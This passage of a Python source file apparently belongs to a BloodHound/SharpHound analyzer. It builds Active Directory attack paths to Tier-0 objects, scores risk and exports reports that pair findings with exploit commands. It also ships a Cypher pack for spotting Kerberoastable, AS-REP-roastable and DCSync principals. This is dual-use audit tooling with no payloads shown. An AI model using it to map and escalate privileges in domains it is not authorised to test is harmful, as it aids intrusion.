    def get_privileged_groups(self) -> List[Dict[str, Any]]:
        """Return privileged groups with their effective member counts."""
        out: List[Dict[str, Any]] = []
        for group in self.data[ObjectType.GROUPS]:
            props = self._props(group)
            sid = self._sid(group)
            name = props.get("name", "")
            rid = sid.rsplit("-", 1)[-1] if "-" in sid else ""
            is_priv = rid in TIER0_RIDS or any(k in name.lower() for k in PRIVILEGED_KEYWORDS)
            if not is_priv:
                continue
            members = self.resolve_group_members(sid)
            out.append({"name": name, "sid": sid, "effective_members": sorted(members)})
        out.sort(key=lambda g: -len(g["effective_members"]))
        # De-duplicate by name (BUILTIN vs domain groups can share a name),
        # keeping the entry with the most effective members.
        seen: Set[str] = set()
        deduped = []
        for g in out:
            if g["name"] in seen:
                continue
            seen.add(g["name"])
            deduped.append(g)
        return deduped

    # ------------------------------------------------------------------ #
    # Scoring
    # ------------------------------------------------------------------ #
    def risk_score(self) -> int:
        """A crude 0-100 exposure score weighted by finding severity."""
        weights = {Severity.CRITICAL: 15, Severity.HIGH: 7, Severity.MEDIUM: 3, Severity.LOW: 1, Severity.INFO: 0}
        raw = sum(weights[f.severity] for f in self.findings)
        return min(100, raw)

    def sorted_findings(self) -> List[Finding]:
        return sorted(self.findings, key=lambda f: (-f.severity.value, f.category, f.principal))

    def attack_paths(self, max_paths: int = 200) -> Dict[str, Any]:
        """Build the in-memory attack graph and return paths to Tier-0 (cached)."""
        if self._attack_cache is None:
            self._attack_cache = AttackGraph(self).compute_paths(max_paths)
        return self._attack_cache

    def extract_names(self, obj_type: ObjectType) -> List[str]:
        return [self._props(o).get("name", "") for o in self.data[obj_type] if self._props(o).get("name")]


# --------------------------------------------------------------------------- #
# Attack graph (offline path-finding, no Neo4j)
# --------------------------------------------------------------------------- #
# Exploit-cost table (GoodHound-style): lower == easier to walk.
EDGE_COST: Dict[str, int] = {
    "MemberOf": 0, "Contains": 0, "GPLink": 0, "CanRDP": 0,
    "AdminTo": 1, "CanPSRemote": 1, "ExecuteDCOM": 1, "AllowedToDelegate": 1,
    "AllowedToAct": 1, "ForceChangePassword": 1, "AddMember": 1, "AddSelf": 1,
    "GenericAll": 1, "GenericWrite": 1, "WriteDacl": 1, "WriteOwner": 1, "Owns": 1,
    "AllExtendedRights": 1, "WriteSPN": 1, "ReadLAPSPassword": 1, "ReadGMSAPassword": 1,
    "AddKeyCredentialLink": 2, "HasSession": 3,
}
DEFAULT_COST = 1


@dataclass
class AttackPath:
    """One attack path source -> Tier-0."""

    source: str
    hops: List[Tuple[str, str]]  # [(edge_type, node_name), ...] ending at the T0 node
    cost: int

    def as_text(self) -> str:
        parts = [self.source]
        for edge, node in self.hops:
            parts.append(f"-[{edge}]->{node}")
        return " ".join(parts)


class AttackGraph:
    """Directed principal graph built from a parsed SharpHound collection."""

    def __init__(self, parser: "SharpHoundParser") -> None:
        self.p = parser
        self.adj: Dict[str, List[Tuple[str, str, int]]] = defaultdict(list)      # src -> [(dst,type,cost)]
        self.radj: Dict[str, List[Tuple[str, str, int]]] = defaultdict(list)     # dst -> [(src,type,cost)]
        self.edge_seen: Set[Tuple[str, str, str]] = set()
        self.tier0: Set[str] = set()
        self.build()

    def _add(self, src: str, dst: str, etype: str) -> None:
        if not src or not dst or src == dst:
            return
        key = (src, dst, etype)
        if key in self.edge_seen:
            return
        self.edge_seen.add(key)
        cost = EDGE_COST.get(etype, DEFAULT_COST)
        self.adj[src].append((dst, etype, cost))
        self.radj[dst].append((src, etype, cost))

    def build(self) -> None:
        P, sid = self.p, self.p._sid  # noqa: N806

        # MemberOf (member -> group) and Tier-0 seed set.
        for group in P.data[ObjectType.GROUPS]:
            gsid = sid(group)
            gname = P._props(group).get("name", "")
            grid = gsid.rsplit("-", 1)[-1] if "-" in gsid else ""
            if grid in TIER0_RIDS or any(k in gname.lower() for k in PRIVILEGED_KEYWORDS):
                self.tier0.add(gsid)
            for m_sid, _ in P.group_members.get(gsid, []):
                self._add(m_sid, gsid, "MemberOf")

        for domain in P.data[ObjectType.DOMAINS]:
            self.tier0.add(sid(domain))  # DCSync target

        # ACE edges from every object (the bulk of ACL paths).
        for ot in (ObjectType.USERS, ObjectType.GROUPS, ObjectType.COMPUTERS,
                   ObjectType.DOMAINS, ObjectType.GPOS, ObjectType.OUS):
            for obj in P.data[ot]:
                osid = sid(obj)
                if P._is_high_value(P._props(obj), obj):
                    self.tier0.add(osid)
                for ace in obj.get("Aces", []) or []:
                    right = ace.get("RightName") or ""
                    psid = ace.get("PrincipalSID", "")
                    if right in DANGEROUS_ACES or right in EDGE_COST:
                        self._add(psid, osid, right)

        # Computer-centric edges: AdminTo, sessions, RBCD.
        for comp in P.data[ObjectType.COMPUTERS]:
            csid = sid(comp)
            for bucket, etype, reverse in (
                ("LocalAdmins", "AdminTo", False),
                ("RemoteDesktopUsers", "CanRDP", False),
                ("PSRemoteUsers", "CanPSRemote", False),
                ("DcomUsers", "ExecuteDCOM", False),
                ("Sessions", "HasSession", True),
            ):
                raw = comp.get(bucket, {})
                results = raw.get("Results", raw) if isinstance(raw, dict) else raw
                for r in results or []:
                    r_sid = r.get("ObjectIdentifier") or r.get("UserSID") or ""
                    if reverse:      # session: computer -> user (creds harvestable)
                        self._add(csid, r_sid, etype)
                    else:            # principal -> computer
                        self._add(r_sid, csid, etype)
            for act in comp.get("AllowedToAct", []) or []:
                a_sid = act.get("ObjectIdentifier", "") if isinstance(act, dict) else str(act)
                self._add(a_sid, csid, "AllowedToAct")

    # -- pathfinding ------------------------------------------------------ #
    def _reverse_bfs(self) -> Dict[str, Tuple[str, str]]:
        """
        One reverse BFS from the whole Tier-0 set over the transposed graph.
        Returns next_hop[node] = (next_node_toward_T0, edge_type). O(V+E).
        """
        next_hop: Dict[str, Tuple[str, str]] = {}
        seen: Set[str] = set(self.tier0)
        queue: deque[str] = deque(self.tier0)
        while queue:
            cur = queue.popleft()
            for src, etype, _cost in self.radj.get(cur, []):
                if src in seen:
                    continue
                seen.add(src)
                next_hop[src] = (cur, etype)
                queue.append(src)
        return next_hop

    def compute_paths(self, max_paths: int = 200) -> Dict[str, Any]:
        """Shortest path to Tier-0 for every enabled, non-admin principal."""
        next_hop = self._reverse_bfs()
        # Sources: enabled, non-privileged users & computers that can reach T0.
        sources: List[str] = []
        for ot in (ObjectType.USERS, ObjectType.COMPUTERS):
            for obj in self.p.data[ot]:
                s = self.p._sid(obj)
                props = self.p._props(obj)
                if not props.get("enabled", True):
                    continue
                if s in self.tier0 or props.get("admincount"):
                    continue
                if s in next_hop:
                    sources.append(s)

        paths: List[AttackPath] = []
        edge_users: Dict[Tuple[str, str], Set[str]] = defaultdict(set)
        # Graph model (by SID) for the BloodHound-style visualization.
        g_nodes: Dict[str, Dict[str, Any]] = {}
        g_edges: Set[Tuple[str, str, str]] = set()

        def node_type(nsid: str) -> str:
            return self.p.sid_to_type.get(nsid, "Unknown")

        def touch(nsid: str) -> None:
            if nsid not in g_nodes:
                g_nodes[nsid] = {
                    "id": nsid,
                    "label": self.p.resolve(nsid),
                    "type": node_type(nsid),
                    "tier0": nsid in self.tier0,
                }

        for s in sources:
            hops: List[Tuple[str, str]] = []
            cur, cost, guard = s, 0, 0
            touch(s)
            while cur in next_hop and guard < 64:
                nxt, etype = next_hop[cur]
                hops.append((etype, self.p.resolve(nxt)))
                cost += EDGE_COST.get(etype, DEFAULT_COST)
                edge_users[(self.p.resolve(cur), etype)].add(s)
                touch(nxt)
                g_edges.add((cur, nxt, etype))
                cur = nxt
                guard += 1
            if hops:
                paths.append(AttackPath(self.p.resolve(s), hops, cost))

        paths.sort(key=lambda p: (p.cost, len(p.hops)))
        # Busiest edges / choke points: edges traversed by the most distinct sources.
        choke = sorted(edge_users.items(), key=lambda kv: -len(kv[1]))[:15]
        return {
            "tier0_size": len(self.tier0),
            "sources_reaching_tier0": len(sources),
            "total_edges": len(self.edge_seen),
            "paths": paths[:max_paths],
            "choke_points": [
                {"edge": f"{node} -[{etype}]->", "users_exposed": len(users)}
                for (node, etype), users in choke
            ],
            "graph": {
                "nodes": list(g_nodes.values()),
                "edges": [{"source": a, "target": b, "label": e} for (a, b, e) in g_edges],
            },
        }


# --------------------------------------------------------------------------- #
# Exporters
# --------------------------------------------------------------------------- #
class OutputExporter:
    @staticmethod
    def export_txt(parser: SharpHoundParser, out: Path, fmt: str = "column") -> None:
        sep = "\n" if fmt == "column" else ","
        for obj_type, fname in ((ObjectType.USERS, "user_names_output.txt"),
                                (ObjectType.COMPUTERS, "computer_names_output.txt")):
            names = parser.extract_names(obj_type)
            (out / fname).write_text(sep.join(names))
            logger.info("Exported %d names to %s", len(names), out / fname)

    @staticmethod
    def export_summary(parser: SharpHoundParser, out: Path) -> None:
        s = parser.statistics
        lines = [
            "=" * 62,
            "  BLOODHOUND COLLECTION SUMMARY",
            f"  Format: {parser.format_version}   Risk score: {parser.risk_score()}/100",
            "=" * 62, "",
            "OBJECT COUNTS:",
            f"  Users:      {s.total_users}",
            f"  Groups:     {s.total_groups}",
            f"  Computers:  {s.total_computers}",
            f"  OUs:        {s.total_ous}",
            f"  GPOs:       {s.total_gpos}",
            f"  CertTemplates: {s.total_cert_templates}", "",
            "USER ANALYSIS:",
            f"  Enabled:              {s.enabled_users}",
            f"  Privileged:           {s.admin_users}",
            f"  Kerberoastable:       {s.kerberoastable}",
            f"  ASREPRoastable:       {s.asreproastable}",
            f"  PASSWD_NOTREQD:       {s.password_not_required}",
            f"  Secrets in desc.:     {s.secrets_in_description}",
            f"  Cleartext pw attrs:   {s.cleartext_password_attrs}",
            f"  Priv. delegatable:    {s.unprotected_privileged}",
            f"  SID history:          {s.sidhistory_users}",
            f"  Stale (>{parser.stale_days}d):        {s.stale_accounts}",
            f"  High value:           {s.high_value_targets}", "",
            "COMPUTER / DELEGATION:",
            f"  Unconstrained deleg.: {s.unconstrained_delegation}",
            f"  Constrained deleg.:   {s.constrained_delegation}",
            f"  RBCD configured:      {s.rbcd_configured}",
            f"  End-of-life OS:       {s.eol_computers}", "",
            "ACL ABUSE:",
            f"  Dangerous ACEs:       {s.dangerous_aces}", "",
        ]
        crit = [f for f in parser.sorted_findings() if f.severity == Severity.CRITICAL]
        if crit:
            lines.append("TOP CRITICAL FINDINGS (with exploit command):")
            for f in crit[:25]:
                arrow = f" -> {f.target}" if f.target else ""
                lines.append(f"  [{f.severity}] {f.category}: {f.principal}{arrow}")
                cmd = exploit_hint(f.category)
                if cmd:
                    lines.append(f"      $ {cmd}")
            lines.append("")
        ap = parser.attack_paths()
        lines += [
            "ATTACK PATHS TO TIER-0:",
            f"  Graph edges:              {ap['total_edges']}",
            f"  Tier-0 objects:           {ap['tier0_size']}",
            f"  Principals reaching T0:   {ap['sources_reaching_tier0']}", "",
        ]
        if ap["paths"]:
            lines.append("  Easiest paths (lowest exploit cost):")
            for path in ap["paths"][:10]:
                lines.append(f"    [cost {path.cost}] {path.as_text()}")
            lines.append("")
        if ap["choke_points"]:
            lines.append("  Top choke points (cut these first):")
            for cp in ap["choke_points"][:8]:
                lines.append(f"    {cp['edge']}  ({cp['users_exposed']} principals exposed)")
            lines.append("")

        pg = parser.get_privileged_groups()
        if pg:
            lines.append("PRIVILEGED GROUPS (effective members):")
            for g in pg:
                lines.append(f"  - {g['name']}: {len(g['effective_members'])} member(s)")
            lines.append("")
        lines.append("=" * 62)
        (out / "resumen.txt").write_text("\n".join(lines))
        logger.info("Summary exported to %s", out / "resumen.txt")

    @staticmethod
    def export_json(parser: SharpHoundParser, out: Path) -> None:
        ap = parser.attack_paths()
        data = {
            "tool_version": __version__,
            "collection_format": parser.format_version,
            "risk_score": parser.risk_score(),
            "statistics": parser.statistics.to_dict(),
            "kerberoastable_users": parser.kerberoastable_users,
            "asreproastable_users": parser.asreproastable_users,
            "high_value_targets": parser.high_value_targets,
            "privileged_groups": parser.get_privileged_groups(),
            "attack_paths": {
                "tier0_size": ap["tier0_size"],
                "sources_reaching_tier0": ap["sources_reaching_tier0"],
                "total_edges": ap["total_edges"],
                "choke_points": ap["choke_points"],
                "paths": [{"source": p.source, "cost": p.cost, "path": p.as_text()}
                          for p in ap["paths"]],
            },
            "findings": [f.to_dict() for f in parser.sorted_findings()],
        }
        (out / "analysis.json").write_text(json.dumps(data, indent=2))
        logger.info("JSON analysis exported to %s", out / "analysis.json")

    @staticmethod
    def export_csv(parser: SharpHoundParser, out: Path) -> None:
        path = out / "findings.csv"
        with path.open("w", newline="", encoding="utf-8") as fh:
            writer = csv.writer(fh)
            writer.writerow(["severity", "category", "principal", "target", "detail", "exploit_command"])
            for f in parser.sorted_findings():
                writer.writerow([str(f.severity), f.category, f.principal, f.target,
                                 f.detail, exploit_hint(f.category)])
        logger.info("CSV findings exported to %s (%d rows)", path, len(parser.findings))

    @staticmethod
    def export_markdown(parser: SharpHoundParser, out: Path) -> None:
        s = parser.statistics
        lines = [
            "# BloodHound Collection Analysis", "",
            f"- **Collection format**: {parser.format_version}",
            f"- **Risk score**: {parser.risk_score()}/100",
            f"- **Tool version**: {__version__}", "",
            "## Statistics", "",
            "| Metric | Count |", "|---|---|",
            f"| Users | {s.total_users} |",
            f"| Groups | {s.total_groups} |",
            f"| Computers | {s.total_computers} |",
            f"| Kerberoastable | {s.kerberoastable} |",
            f"| ASREPRoastable | {s.asreproastable} |",
            f"| Unconstrained delegation | {s.unconstrained_delegation} |",
            f"| RBCD configured | {s.rbcd_configured} |",
            f"| Dangerous ACEs | {s.dangerous_aces} |",
            f"| Secrets in description | {s.secrets_in_description} |",
            f"| End-of-life OS | {s.eol_computers} |", "",
            "## Findings (by severity)", "",
            "| Severity | Category | Principal | Target | Detail | Exploit command |",
            "|---|---|---|---|---|---|",
        ]
        for f in parser.sorted_findings():
            cmd = exploit_hint(f.category).replace("|", "\\|")
            lines.append(
                f"| {f.severity} | {f.category} | `{f.principal}` | "
                f"{('`' + f.target + '`') if f.target else ''} | {f.detail} | "
                f"{('`' + cmd + '`') if cmd else ''} |"
            )
        lines.append("")
        pg = parser.get_privileged_groups()
        if pg:
            lines += ["## Privileged groups", "", "| Group | Effective members |", "|---|---|"]
            for g in pg:
                lines.append(f"| `{g['name']}` | {len(g['effective_members'])} |")
        (out / "report.md").write_text("\n".join(lines))
        logger.info("Markdown report exported to %s", out / "report.md")

    @staticmethod
    def export_html(parser: SharpHoundParser, out: Path) -> None:
        s = parser.statistics
        colors = {"CRITICAL": "#c0392b", "HIGH": "#e67e22", "MEDIUM": "#f1c40f",
                  "LOW": "#3498db", "INFO": "#7f8c8d"}
        rows = []
        for f in parser.sorted_findings():
            sev = str(f.severity)
            cmd = exploit_hint(f.category)
            cmd_html = f"<code>{html.escape(cmd)}</code>" if cmd else ""
            rows.append(
                f"<tr><td><span class='sev' style='background:{colors[sev]}'>{sev}</span></td>"
                f"<td>{html.escape(f.category)}</td><td>{html.escape(f.principal)}</td>"
                f"<td>{html.escape(f.target)}</td><td>{html.escape(f.detail)}</td>"
                f"<td>{cmd_html}</td></tr>"
            )
        ap = parser.attack_paths()
        cards = "".join(
            f"<div class='card'><div class='n'>{v}</div><div class='l'>{k}</div></div>"
            for k, v in [
                ("Users", s.total_users), ("Computers", s.total_computers),
                ("Kerberoastable", s.kerberoastable), ("ASREPRoast", s.asreproastable),
                ("Unconstrained", s.unconstrained_delegation), ("RBCD", s.rbcd_configured),
                ("Dangerous ACEs", s.dangerous_aces),
                ("Paths&#8594;T0", ap["sources_reaching_tier0"]),
                ("Risk", f"{parser.risk_score()}/100"),
            ]
        )
        path_rows = "".join(
            f"<tr><td>{html.escape(p.source)}</td><td>{p.cost}</td>"
            f"<td><code>{html.escape(p.as_text())}</code></td></tr>"
            for p in ap["paths"][:50]
        )
        choke_rows = "".join(
            f"<tr><td><code>{html.escape(c['edge'])}</code></td><td>{c['users_exposed']}</td></tr>"
            for c in ap["choke_points"]
        )

        # Interactive BloodHound-style attack-path graph.
        graph = ap.get("graph", {"nodes": [], "edges": []})
        graph_json = json.dumps(graph).replace("</", "<\\/")
        if graph["nodes"]:
            graph_section = (
                "<h2>Attack-path graph &mdash; interactive</h2>"
                "<div class='ghint'>Drag nodes &middot; scroll to zoom &middot; drag the "
                "background to pan. Arrows point toward Tier-0; gold ring = Tier-0 target.</div>"
                "<div id='graphwrap'><svg id='graph'></svg>"
                "<div id='legend'>"
                "<div><i style='background:#3498db'></i>User</div>"
                "<div><i style='background:#f1c40f'></i>Group</div>"
                "<div><i style='background:#1abc9c'></i>Computer</div>"
                "<div><i style='background:#9b59b6'></i>Domain</div>"
                "<div><i style='background:#7f8c8d'></i>Other</div>"
                "<div><i style='background:#0b0d12;border:3px solid #f5c518'></i>Tier-0</div>"
                "</div></div>"
            )
        else:
            graph_section = ""

        paths_section = (
            f"<h2>Attack paths to Tier-0 ({ap['sources_reaching_tier0']} principals, "
            f"{ap['total_edges']} edges)</h2>"
            "<table><thead><tr><th>Source</th><th>Cost</th><th>Path</th></tr></thead>"
            f"<tbody>{path_rows or '<tr><td colspan=3>No paths found</td></tr>'}</tbody></table>"
            "<h2>Top choke points (remediate first)</h2>"
            "<table><thead><tr><th>Edge</th><th>Principals exposed</th></tr></thead>"
            f"<tbody>{choke_rows or '<tr><td colspan=2>-</td></tr>'}</tbody></table>"
        )

        header = (
            '<header><h1>&#128062; BloodHound Parser Report</h1>'
            f'<div class="sub">Format: {parser.format_version} &middot; '
            f'Generated {_dt.datetime.now():%Y-%m-%d %H:%M} &middot; v{__version__}</div></header>'
        )
        script = "<script>" + GRAPH_JS.replace("__GRAPH_DATA__", graph_json) + "</script>"
        doc = (
            '<!doctype html><html lang="en"><head><meta charset="utf-8">'
            "<title>BloodHound Parser Report</title><style>" + HTML_CSS + "</style></head><body>"
            + header
            + f'<div class="cards">{cards}</div>'
            + graph_section
            + paths_section
            + f"<h2>Findings ({len(parser.findings)})</h2>"
            + "<table><thead><tr><th>Severity</th><th>Category</th><th>Principal</th>"
            "<th>Target</th><th>Detail</th><th>Exploit command</th></tr></thead>"
            + f"<tbody>{''.join(rows)}</tbody></table>"
            + script
            + "</body></html>"
        )
        (out / "report.html").write_text(doc)
        logger.info("HTML report exported to %s", out / "report.html")

    @staticmethod
    def export_cypher(parser: SharpHoundParser, out: Path) -> None:
        """Write a ready-to-paste Neo4j Cypher hunting pack for BloodHound CE."""
        queries = CYPHER_PACK.strip() + "\n"
        (out / "hunting_queries.cypher").write_text(queries)
        logger.info("Cypher hunting pack exported to %s", out / "hunting_queries.cypher")


# CSS for the HTML report (kept out of the f-string to avoid brace escaping).
HTML_CSS = """
 body{font-family:system-ui,Segoe UI,sans-serif;margin:0;background:#0f1115;color:#e6e6e6}
 header{padding:24px 32px;background:#1a1d24;border-bottom:2px solid #c0392b}
 h1{margin:0;font-size:22px} .sub{color:#9aa0a6;font-size:13px;margin-top:4px}
 .cards{display:flex;flex-wrap:wrap;gap:14px;padding:24px 32px}
 .card{background:#1a1d24;border-radius:10px;padding:16px 22px;min-width:120px}
 .card .n{font-size:26px;font-weight:700} .card .l{color:#9aa0a6;font-size:12px;margin-top:4px}
 table{width:calc(100% - 64px);margin:0 32px 40px;border-collapse:collapse;font-size:13px}
 th,td{text-align:left;padding:8px 10px;border-bottom:1px solid #2a2e37;vertical-align:top}
 th{color:#9aa0a6;text-transform:uppercase;font-size:11px;letter-spacing:.5px}
 .sev{display:inline-block;padding:2px 8px;border-radius:6px;color:#111;font-weight:700;font-size:11px}
 h2{padding:0 32px;margin-top:8px} code{color:#8fd3fe;font-size:12px}
 .ghint{padding:0 32px;color:#9aa0a6;font-size:12px;margin:2px 0 10px}
 #graphwrap{position:relative;margin:0 32px 34px;border:1px solid #2a2e37;border-radius:10px;
   background:radial-gradient(circle at 50% 40%,#141824,#0b0d12);overflow:hidden}
 #graph{width:100%;height:560px;display:block;cursor:grab}
 #legend{position:absolute;top:12px;right:12px;background:rgba(26,29,36,.85);
   padding:10px 12px;border-radius:8px;font-size:12px}
 #legend div{display:flex;align-items:center;gap:7px;margin:3px 0}
 #legend i{width:12px;height:12px;border-radius:50%;display:inline-block;box-sizing:border-box}
 .edgelabel{fill:#8a92a0;font-size:9px;font-family:system-ui,sans-serif}
 .nodelabel{fill:#e6e6e6;font-size:10px;font-family:system-ui,sans-serif;pointer-events:none}
"""

# Self-contained force-directed graph engine (vanilla JS, no external libs).
# __GRAPH_DATA__ is replaced at export time with {nodes:[...], edges:[...]}.
GRAPH_JS = r"""
(function(){
  var DATA = __GRAPH_DATA__;
  var svg = document.getElementById('graph');
  if(!svg || !DATA.nodes || !DATA.nodes.length) return;
  var NS='http://www.w3.org/2000/svg';
  var COLORS={User:'#3498db',Group:'#f1c40f',Computer:'#1abc9c',Domain:'#9b59b6',
              Gpo:'#e67e22',Ou:'#95a5a6',Unknown:'#7f8c8d'};
  var W=svg.getBoundingClientRect().width||900, H=560;
  var nodes=DATA.nodes.map(function(n){return {id:n.id,label:n.label,type:n.type,tier0:n.tier0,
    x:W/2+(Math.random()-0.5)*W*0.6, y:H/2+(Math.random()-0.5)*H*0.6};});
  var idx={}; nodes.forEach(function(n,i){n._i=i; idx[n.id]=n;});
  var edges=DATA.edges.filter(function(e){return idx[e.source]&&idx[e.target];})
                      .map(function(e){return {s:idx[e.source],t:idx[e.target],label:e.label};});

  var defs=document.createElementNS(NS,'defs');
  defs.innerHTML='<marker id="arrow" viewBox="0 0 10 10" refX="20" refY="5" markerWidth="7" '+
    'markerHeight="7" orient="auto-start-reverse"><path d="M0,0L10,5L0,10z" fill="#6b7688"/></marker>';
  svg.appendChild(defs);
  var vp=document.createElementNS(NS,'g'); svg.appendChild(vp);
  var eL=document.createElementNS(NS,'g'); vp.appendChild(eL);
  var lL=document.createElementNS(NS,'g'); vp.appendChild(lL);
  var nL=document.createElementNS(NS,'g'); vp.appendChild(nL);

  var eEls=edges.map(function(e){
    var ln=document.createElementNS(NS,'line');
    ln.setAttribute('stroke','#5a6472'); ln.setAttribute('stroke-width','1.6');
    ln.setAttribute('marker-end','url(#arrow)'); eL.appendChild(ln);
    var tx=document.createElementNS(NS,'text'); tx.setAttribute('class','edgelabel');
    tx.setAttribute('text-anchor','middle'); tx.textContent=e.label; lL.appendChild(tx);
    return {e:e,ln:ln,tx:tx};
  });
  var nEls=nodes.map(function(n){
    var g=document.createElementNS(NS,'g'); g.style.cursor='pointer';
    var r=n.tier0?13:9;
    var c=document.createElementNS(NS,'circle'); c.setAttribute('r',r);
    c.setAttribute('fill',COLORS[n.type]||COLORS.Unknown);
    c.setAttribute('stroke',n.tier0?'#f5c518':'#0b0d12');
    c.setAttribute('stroke-width',n.tier0?3:1.5);
    var t=document.createElementNS(NS,'text'); t.setAttribute('class','nodelabel');
    t.setAttribute('x',r+3); t.setAttribute('y',4); t.textContent=n.label.split('@')[0];
    var ti=document.createElementNS(NS,'title');
    ti.textContent=n.label+' ('+n.type+(n.tier0?', Tier-0':'')+')';
    g.appendChild(c); g.appendChild(t); g.appendChild(ti); nL.appendChild(g);
    g.addEventListener('mousedown',function(ev){ev.stopPropagation();mode='node';dragN=n;});
    return {n:n,g:g};
  });

  var K=Math.sqrt((W*H)/nodes.length)*0.55, temp=W*0.10;
  for(var it=0; it<320; it++){
    var dsp=nodes.map(function(){return {x:0,y:0};});
    for(var i=0;i<nodes.length;i++){
      for(var j=i+1;j<nodes.length;j++){
        var dx=nodes[i].x-nodes[j].x, dy=nodes[i].y-nodes[j].y, d=Math.hypot(dx,dy)||0.01;
        var f=K*K/d, ux=dx/d, uy=dy/d;
        dsp[i].x+=ux*f; dsp[i].y+=uy*f; dsp[j].x-=ux*f; dsp[j].y-=uy*f;
      }
    }
    edges.forEach(function(e){
      var dx=e.t.x-e.s.x, dy=e.t.y-e.s.y, d=Math.hypot(dx,dy)||0.01;
      var f=d*d/K, ux=dx/d, uy=dy/d;
      dsp[e.s._i].x+=ux*f; dsp[e.s._i].y+=uy*f; dsp[e.t._i].x-=ux*f; dsp[e.t._i].y-=uy*f;
    });
    for(var k=0;k<nodes.length;k++){
      dsp[k].x+=(W/2-nodes[k].x)*0.012; dsp[k].y+=(H/2-nodes[k].y)*0.012;
      var dl=Math.hypot(dsp[k].x,dsp[k].y)||0.01;
      nodes[k].x+=(dsp[k].x/dl)*Math.min(dl,temp);
      nodes[k].y+=(dsp[k].y/dl)*Math.min(dl,temp);
    }
    temp*=0.985;
  }

  function render(){
    eEls.forEach(function(o){
      o.ln.setAttribute('x1',o.e.s.x); o.ln.setAttribute('y1',o.e.s.y);
      o.ln.setAttribute('x2',o.e.t.x); o.ln.setAttribute('y2',o.e.t.y);
      o.tx.setAttribute('x',(o.e.s.x+o.e.t.x)/2); o.tx.setAttribute('y',(o.e.s.y+o.e.t.y)/2-3);
    });
    nEls.forEach(function(o){o.g.setAttribute('transform','translate('+o.n.x+','+o.n.y+')');});
  }
  var scale=1, ox=0, oy=0;
  function applyVP(){vp.setAttribute('transform','translate('+ox+','+oy+') scale('+scale+')');}
  render(); applyVP();

  var mode=null, sx=0, sy=0, dragN=null;
  svg.addEventListener('mousedown',function(ev){mode='pan';sx=ev.clientX;sy=ev.clientY;svg.style.cursor='grabbing';});
  window.addEventListener('mousemove',function(ev){
    if(mode==='pan'){ox+=ev.clientX-sx;oy+=ev.clientY-sy;sx=ev.clientX;sy=ev.clientY;applyVP();}
    else if(mode==='node'&&dragN){var r=svg.getBoundingClientRect();
      dragN.x=(ev.clientX-r.left-ox)/scale; dragN.y=(ev.clientY-r.top-oy)/scale; render();}
  });
  window.addEventListener('mouseup',function(){mode=null;dragN=null;svg.style.cursor='grab';});
  svg.addEventListener('wheel',function(ev){
    ev.preventDefault(); var r=svg.getBoundingClientRect();
    var mx=ev.clientX-r.left, my=ev.clientY-r.top, f=ev.deltaY<0?1.1:0.9;
    var ns=Math.max(0.2,Math.min(4,scale*f));
    ox=mx-(mx-ox)*(ns/scale); oy=my-(my-oy)*(ns/scale); scale=ns; applyVP();
  },{passive:false});
})();
"""


# A curated Cypher pack; also shipped standalone in cypher/queries.cypher.
CYPHER_PACK = r"""
// ── BloodHound CE hunting pack (generated by BloodHound Parser) ──
// Kerberoastable users
MATCH (u:User) WHERE u.hasspn = true AND u.enabled = true RETURN u.name;
// ASREPRoastable users
MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u.name;
// Unconstrained delegation (non-DC)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name;
// Shortest paths to Domain Admins from owned principals
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group)) WHERE g.name STARTS WITH 'DOMAIN ADMINS@' RETURN p;
// Principals with DCSync (GetChanges + GetChangesAll) on the domain
MATCH (n)-[:GetChanges]->(d:Domain), (n)-[:GetChangesAll]->(d) RETURN n.name, d.name;
// Dangerous ACL edges toward Tier-0 objects
MATCH p=(n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddKeyCredentialLink|ForceChangePassword]->(t)
  WHERE t.system_tags CONTAINS 'admin_tier_0' RETURN p LIMIT 200;
// Computers where a non-privileged user can read the LAPS password
MATCH p=(u:User)-[:ReadLAPSPassword]->(c:Computer) RETURN p;
// RBCD: who can act on behalf of a computer
MATCH p=(n)-[:AllowedToAct]->(c:Computer) RETURN p;
"""


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="parseSharpHound.py",
        description="Analyze BloodHound / SharpHound JSON collections (folder or .zip).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s ./bloodhound_output/                 # analyze a folder, all formats
  %(prog)s collection.zip -f html -o report/    # read a .zip, HTML report
  %(prog)s ./bh/ -f csv --stale-days 90         # CSV findings, 90-day stale window
""",
    )
    p.add_argument("source", type=Path, help="Directory OR .zip containing SharpHound JSON files")
    p.add_argument("-o", "--output", type=Path, help="Output directory (default: alongside input)")
    p.add_argument("-f", "--format", default="all",
                   choices=["txt", "json", "csv", "markdown", "html", "cypher", "all"],
                   help="Export format (default: all)")
    p.add_argument("--output-format", default="column", choices=["column", "comma"],
                   help="Layout for the plain name lists (default: column)")
    p.add_argument("--stale-days", type=int, default=180,
                   help="Days of inactivity before an account is 'stale' (default: 180)")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose (debug) logging")
    p.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")
    return p


def main(argv: Optional[List[str]] = None) -> int:
    args = build_arg_parser().parse_args(argv)
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    if not args.source.exists():
        logger.error("Source not found: %s", args.source)
        return 1

    out_dir = args.output if args.output else (
        args.source if args.source.is_dir() else args.source.parent
    )
    out_dir.mkdir(parents=True, exist_ok=True)

    try:
        parser = SharpHoundParser(args.source, stale_days=args.stale_days)
        parser.parse_all()

        fmt = args.format
        if fmt in ("txt", "all"):
            OutputExporter.export_txt(parser, out_dir, args.output_format)
            OutputExporter.export_summary(parser, out_dir)
        if fmt in ("json", "all"):
            OutputExporter.export_json(parser, out_dir)
        if fmt in ("csv", "all"):
            OutputExporter.export_csv(parser, out_dir)
        if fmt in ("markdown", "all"):
            OutputExporter.export_markdown(parser, out_dir)
        if fmt in ("html", "all"):
            OutputExporter.export_html(parser, out_dir)
        if fmt in ("cypher", "all"):
            OutputExporter.export_cypher(parser, out_dir)

        logger.info("Done. Risk score: %d/100. Output: %s", parser.risk_score(), out_dir)
        return 0
    except Exception as exc:  # noqa: BLE001
        logger.error("Error: %s", exc)
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
